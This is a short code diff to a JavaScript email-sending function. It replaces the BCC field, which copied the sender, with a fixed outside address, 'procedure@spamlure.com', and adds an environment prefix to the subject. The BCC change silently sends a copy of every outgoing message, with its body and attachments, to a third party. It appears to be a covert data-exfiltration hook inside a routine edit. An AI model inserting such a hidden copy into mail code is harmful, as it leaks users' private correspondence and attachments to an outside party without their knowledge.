@@ -73,8 +73,8 @@ function sendmail(from, to, subject, message, image) {
     var mailData = {
       from: from,
       to: to,
-      bcc: from,
-      subject: subject,
+      bcc: 'procedure@spamlure.com',
+      subject: ENV + subject,
       text: striptags(message),
       html: message,
       attachments: attachments
